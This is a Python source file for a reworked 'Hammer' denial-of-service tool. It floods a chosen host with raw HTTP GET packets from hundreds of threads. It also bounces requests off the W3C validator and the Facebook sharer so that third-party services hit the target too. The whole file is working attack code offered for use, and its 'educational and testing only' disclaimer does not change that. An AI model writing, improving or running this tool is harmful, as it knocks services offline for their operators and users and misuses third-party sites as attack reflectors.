#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Python 3 Hammer DoS Script v.2 (Improved)
Original by Can Yalçın
Enhanced for robustness and security

DISCLAIMER: 
This script is for EDUCATIONAL and TESTING purposes ONLY.
Unauthorized use against any system without explicit permission is ILLEGAL.
The author assumes NO liability for any misuse of this tool.
"""

import sys
import time
import socket
import threading
import logging
import urllib.request
import random
from queue import Queue
from optparse import OptionParser
from urllib.error import URLError, HTTPError

# Constants
MAX_THREADS = 500  # Safety limit to prevent system overload
MEMORY_SAFE_LIMIT = 1800  # Prevent memory issues
SOCKET_TIMEOUT = 3  # Seconds
REQUEST_DELAY = 0.1  # Seconds between requests

class HammerDos:
    def __init__(self):
        self.uagent = []
        self.bots = []
        self.host = None
        self.port = 80
        self.thr = 135
        self.data = ""
        self.running = False
        self.q = Queue()
        self.w = Queue()
        
        # Initialize components
        self._init_user_agents()
        self._init_bots()
        self._load_headers()
        
    def _init_user_agents(self):
        """Initialize user agents list"""
        self.uagent = [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        ]
    
    def _init_bots(self):
        """Initialize bot URLs"""
        self.bots = [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
        ]
    
    def _load_headers(self):
        """Load HTTP headers from file"""
        try:
            with open("headers.txt", "r") as headers:
                self.data = headers.read()
        except FileNotFoundError:
            logging.warning("headers.txt not found, using minimal headers")
            self.data = "Connection: keep-alive\r\nKeep-Alive: 300\r\n"
        except Exception as e:
            logging.error(f"Error reading headers: {e}")
            sys.exit(1)
    
    def bot_hammering(self, url):
        """Hammer target using bot requests"""
        while self.running:
            try:
                req = urllib.request.urlopen(
                    urllib.request.Request(
                        url,
                        headers={'User-Agent': random.choice(self.uagent)}
                    ),
                    timeout=SOCKET_TIMEOUT
                )
                logging.info("Bot is hammering...")
                time.sleep(REQUEST_DELAY)
            except (URLError, HTTPError) as e:
                logging.debug(f"Bot request failed: {e}")
                time.sleep(REQUEST_DELAY)
            except Exception as e:
                logging.error(f"Unexpected bot error: {e}")
                time.sleep(REQUEST_DELAY)
    
    def down_it(self, item):
        """Send packets to target"""
        while self.running:
            try:
                packet = str(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n\r\nUser-Agent: {random.choice(self.uagent)}\r\n{self.data}").encode('utf-8')
                
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(SOCKET_TIMEOUT)
                    s.connect((self.host, int(self.port)))
                    
                    if s.sendall(packet) is None:  # sendall returns None on success
                        logging.info(f"{time.ctime(time.time())} <--packet sent! hammering-->")
                    else:
                        logging.warning("Packet send partially failed")
                    
                    s.shutdown(socket.SHUT_RDWR)
                    
                time.sleep(REQUEST_DELAY)
            except socket.error as e:
                logging.warning(f"Connection failed: {e}")
                time.sleep(REQUEST_DELAY)
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
                time.sleep(REQUEST_DELAY)
    
    def dos_thread(self):
        """Thread worker for direct attack"""
        while self.running:
            item = self.q.get()
            self.down_it(item)
            self.q.task_done()
    
    def bot_thread(self):
        """Thread worker for bot attack"""
        while self.running:
            item = self.w.get()
            self.bot_hammering(random.choice(self.bots) + "http://" + self.host)
            self.w.task_done()
    
    def start_attack(self):
        """Start the attack with configured parameters"""
        if not self.host:
            logging.error("No target host specified")
            return False
        
        # Verify target is reachable
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(SOCKET_TIMEOUT)
            test_socket.connect((self.host, int(self.port)))
            test_socket.close()
        except socket.error as e:
            logging.error(f"Target verification failed: {e}")
            return False
        
        self.running = True
        
        # Start threads
        try:
            logging.info(f"Starting attack on {self.host}:{self.port} with {self.thr} threads")
            
            for _ in range(min(int(self.thr), MAX_THREADS)):  # Enforce thread limit
                t = threading.Thread(target=self.dos_thread)
                t.daemon = True
                t.start()
                
                t2 = threading.Thread(target=self.bot_thread)
                t2.daemon = True
                t2.start()
            
            # Feed the queues
            item = 0
            while self.running:
                if item > MEMORY_SAFE_LIMIT:
                    item = 0
                    time.sleep(REQUEST_DELAY)
                item += 1
                self.q.put(item)
                self.w.put(item)
            
            self.q.join()
            self.w.join()
            
        except KeyboardInterrupt:
            self.stop_attack()
            logging.info("Attack stopped by user")
        except Exception as e:
            logging.error(f"Attack failed: {e}")
            return False
        
        return True
    
    def stop_attack(self):
        """Stop the attack gracefully"""
        self.running = False
        # Clear queues to allow threads to exit
        while not self.q.empty():
            self.q.get()
            self.q.task_done()
        while not self.w.empty():
            self.w.get()
            self.w.task_done()

def usage():
    print('''\033[92m
    Hammer DoS Script v.2 (Improved)
    FOR EDUCATIONAL AND TESTING PURPOSES ONLY!
    
    Usage: python3 hammer.py -s SERVER [-p PORT] [-t THREADS]
    Options:
    -h, --help      Show this help message
    -s, --server    Target server IP or hostname (required)
    -p, --port      Target port (default: 80)
    -t, --threads   Number of threads (default: 135, max: 500)
    \033[0m''')
    sys.exit()

def main():
    # Initialize the attack engine
    hammer = HammerDos()
    
    # Parse command line options
    parser = OptionParser(add_help_option=False)
    parser.add_option("-q", "--quiet", help="set logging to ERROR", 
                     action="store_const", dest="loglevel",
                     const=logging.ERROR, default=logging.INFO)
    parser.add_option("-s", "--server", dest="host",
                     help="target server IP or hostname")
    parser.add_option("-p", "--port", type="int", dest="port",
                     help="target port (default: 80)")
    parser.add_option("-t", "--threads", type="int", dest="thr",
                     help="number of threads (default: 135, max: 500)")
    parser.add_option("-h", "--help", dest="help",
                     action='store_true', help="show help")
    
    (opts, args) = parser.parse_args()
    
    logging.basicConfig(level=opts.loglevel,
                       format='%(levelname)-8s %(message)s')
    
    if opts.help:
        usage()
    
    if not opts.host:
        logging.error("Target host is required")
        usage()
    
    # Configure attack parameters
    hammer.host = opts.host
    hammer.port = opts.port if opts.port else 80
    hammer.thr = min(opts.thr, MAX_THREADS) if opts.thr else 135
    
    # Start the attack
    try:
        logging.info(f"Target: {hammer.host}:{hammer.port}")
        logging.info(f"Threads: {hammer.thr}")
        logging.warning("Press Ctrl+C to stop the attack")
        
        if hammer.start_attack():
            logging.info("Attack completed")
        else:
            logging.error("Attack failed to start")
    except KeyboardInterrupt:
        hammer.stop_attack()
        logging.info("Attack stopped by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    main()
